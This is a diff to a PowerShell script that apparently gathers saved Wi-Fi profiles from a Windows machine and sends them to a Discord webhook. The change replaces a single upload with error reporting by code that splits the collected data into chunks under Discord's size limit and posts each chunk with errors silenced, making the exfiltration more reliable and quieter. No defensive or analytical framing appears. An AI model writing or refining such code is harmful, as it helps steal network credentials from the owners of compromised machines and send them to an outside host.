@@ -22,24 +22,27 @@ $wifiList = foreach ($profile in $profiles) {
     }
 }
 
-# Fix: Discord requires a valid JSON object with "content" key at the top level
-$Payload = @{
-    content = ($wifiList | ConvertTo-Json)
-} | ConvertTo-Json
+# Chunking logic for Discord API size limit
+$MaxChunkSize = 1900
+$CurrentChunk = ""
 
 Write-Host "Sending to webhook"
 
-try {
-    $Response = Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Payload -ContentType "application/json"
-}
-catch {
-    Write-Host "Exception:"
-    Write-Host $_.Exception.Message
-
-    if ($_.ErrorDetails.Message) {
-        Write-Host "Response:"
-        Write-Host $_.ErrorDetails.Message
+foreach ($chunk in $wifiList | ConvertTo-Json) {
+    if (($CurrentChunk.Length + $chunk.Length + 1) -gt $MaxChunkSize) {
+        if ($CurrentChunk.Trim() -ne "") {
+            $Payload = @{ content = $CurrentChunk } | ConvertTo-Json
+            $Response = Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Payload -ContentType "application/json" -ErrorAction SilentlyContinue
+        }
+        $CurrentChunk = $chunk + "`n"
+    } else {
+        $CurrentChunk += $chunk + "`n"
     }
+}
+
+if ($CurrentChunk.Trim() -ne "") {
+    $Payload = @{ content = $CurrentChunk } | ConvertTo-Json
+    $Response = Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Payload -ContentType "application/json" -ErrorAction SilentlyContinue
 }
 
 Write-Host "done."
